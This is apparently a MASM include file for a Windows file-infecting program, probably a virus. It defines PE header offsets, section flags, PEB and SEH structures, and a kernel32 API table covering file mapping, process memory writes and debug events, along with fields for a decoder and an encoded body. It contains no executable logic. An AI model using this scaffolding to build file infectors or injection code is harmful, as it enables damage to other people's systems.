OPEN_ALWAYS                                           equ     4
OPEN_EXISTING                                         equ     3
FILE_ATTRIBUTE_ARCHIVE                                equ     20h                  ;smaller
PAGE_READWRITE                                        equ     4
FILE_MAP_WRITE                                        equ     2

IMAGE_DOS_HEADER_E_LFANEW                             equ     3ch

IMAGE_NT_HEADERS_FILEHEADER_MACHINE                   equ     4
IMAGE_NT_HEADERS_FILEHEADER_NUMBER_OF_SECTIONS        equ     6
IMAGE_NT_HEADERS_FILEHEADER_SIZEOF_OPTIONAL_HEADER    equ     14h
IMAGE_NT_HEADERS_FILEHEADER_CHARACTERISTICS           equ     16h

IMAGE_FILE_MACHINE_I386                               equ     14ch
IMAGE_FILE_EXECUTABLE_IMAGE                           equ     2
IMAGE_FILE_SYSTEM                                     equ     1000h
IMAGE_FILE_DLL                                        equ     2000h

IMAGE_NT_HEADERS_OPTIONALHEADER_MAGIC                 equ     18h
IMAGE_NT_HEADERS_OPTIONALHEADER_ADDRESS_OF_ENTRYPOINT equ     28h
IMAGE_NT_HEADERS_OPTIONALHEADER_SUBSYSTEM             equ     5ch
IMAGE_NT_HEADERS_OPTIONALHEADER_DLLCHARACTERISTICS    equ     5eh

IMAGE_DLLCHARACTERISTICS_NO_SEH                       equ     400h
IMAGE_DLLCHARACTERISTICS_FORCE_INTEGRITY              equ     80h

IMAGE_NT_OPTIONAL_HDR32_MAGIC                         equ     10bh
IMAGE_SUBSYSTEM_WINDOWS_GUI                           equ     2

IMAGE_DIRECTORY_ENTRY_RELOC_TABLE                     equ     0a0h                 ;offset from beginning of NT_HEADERS
IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG_TABLE               equ     0c8h                 ;offset from beginning of NT_HEADERS

IMAGE_SECTION_HEADER_VIRTUAL_ADDRESS                  equ     0ch
IMAGE_SECTION_HEADER_SIZE_OF_RAW_DATA                 equ     10h
IMAGE_SECTION_HEADER_POINTER_TO_RAW_DATA              equ     14h
IMAGE_SECTION_HEADER_CHARACTERISTICS                  equ     24h
IMAGE_SECTION_HEADER_SIZEOF                           equ     28h

IMAGE_SCN_MEM_EXECUTE                                 equ     20000000h
IMAGE_SCN_MEM_WRITE                                   equ     80000000h

IMAGE_EXPORT_DIRECTORY_NUMBER_OF_NAMES                equ     18h
IMAGE_EXPORT_DIRECTORY_ADDRESS_OF_FUNCTIONS           equ     1ch
IMAGE_EXPORT_DIRECTORY_ADDRESS_OF_NAMES               equ     20h
IMAGE_EXPORT_DIRECTORY_ADDRESS_OF_NAME_ORDINALS       equ     24h

SEM_NOALIGNMENTFAULTEXCEPT                            equ     4

ERROR_EXE_MACHINE_TYPE_MISMATCH                       equ     0d8h

TIMEWAIT                                              equ     1000 * 4

debugObjectFileSize                                   equ     1000h

CALL_OP                                               equ     0e8h
INT3_OP                                               equ     0cch

mapFlags struct
	ExceptionFlag BYTE ?
	FileFlag      BYTE ?
	reopenFlag    BYTE ?
	Reserved      BYTE ?
mapFlags ends

mapStores struct
    bodyStore1  DWORD ?                       ;address of decoder buffer
    bodyStore2  DWORD ?                       ;address of encoded body
mapStores ends

mapStackAPIK32 struct
    kWriteProcessMemory  DWORD ?
    kWriteFile           DWORD ?
    kWaitForDebugEvent   DWORD ?
    kUnmapViewOfFile     DWORD ?
    kSetThreadContext    DWORD ?
    kSetFileAttributesA  DWORD ?
    kSetErrorMode        DWORD ?
    kReadProcessMemory   DWORD ?
    kMapViewOfFile       DWORD ?
    kGlobalFree          DWORD ?
    kGlobalAlloc         DWORD ?
    kGetThreadContext    DWORD ?
    kGetLastError        DWORD ?
    kFindNextFileA       DWORD ?
    kFindFirstFileA      DWORD ?
    kFindClose           DWORD ?
    kCreateProcessA      DWORD ?
    kCreateFileMappingA  DWORD ?
    kCreateFileA         DWORD ?
    kContinueDebugEvent  DWORD ?
    kCloseHandle         DWORD ?
mapStackAPIK32 ends

mapStackRegisters struct
    regEdi  DWORD ?
    regEsi  DWORD ?
    regEbp  DWORD ?
    regEsp  DWORD ?
    regEbx  DWORD ?
    regEdx  DWORD ?
    regEcx  DWORD ?
    regEax  DWORD ?
mapStackRegisters ends

mapSEH struct
    pSEHPFrame         DWORD ?
    pExceptionHandler  DWORD ?
    Registers          mapStackRegisters <?>
mapSEH ends

WIN32_FIND_DATA struct
    dwFileAttributes  DWORD ?
    ftCreationTime    QWORD ?
    ftLastAccessTime  QWORD ?
    ftLastWriteTime   QWORD ?
    nFileSizeHigh     DWORD ?
    nFileSizeLow      DWORD ?
    dwReserved0       DWORD ?
    dwReserved1       DWORD ?
    cFileName         BYTE 260 dup (?)
    cAlternate        BYTE 0eh dup (?)
WIN32_FIND_DATA ends

PROCESS_INFORMATION2 struct
    hProcess  DWORD ?
    hThread   DWORD ?
PROCESS_INFORMATION2 ends

LIST_ENTRY struct
    FLink  DWORD ?
    BLink  DWORD ?
LIST_ENTRY ends

_PEB_LDR_DATA struct
    dwLength                           DWORD ?
    bInitialized                       DWORD ?
    dwSsHandle                         DWORD ?
    dwInLoadOrderModuleList            LIST_ENTRY <?>
    dwInMemoryOrderModuleList          LIST_ENTRY <?>
    dwInInitializationOrderModuleList  LIST_ENTRY <?>
_PEB_LDR_DATA ends

PROCESS_ENVIRONMENT_BLOCK struct
	bInhiritedAddressSpace     BYTE ?
	bReadImageFileExecOptions  BYTE ?
	bBeingDebugged             BYTE ?
	bSpare                     BYTE ?
	hMutant                    DWORD ?
	dwImageBaseAddress         DWORD ?
	lpLoaderData               DWORD ?
	lpProcessParameters        DWORD ?
PROCESS_ENVIRONMENT_BLOCK ends

include kernel32.inc
include user32.inc
include windows.inc

includelib kernel32.lib
includelib user32.lib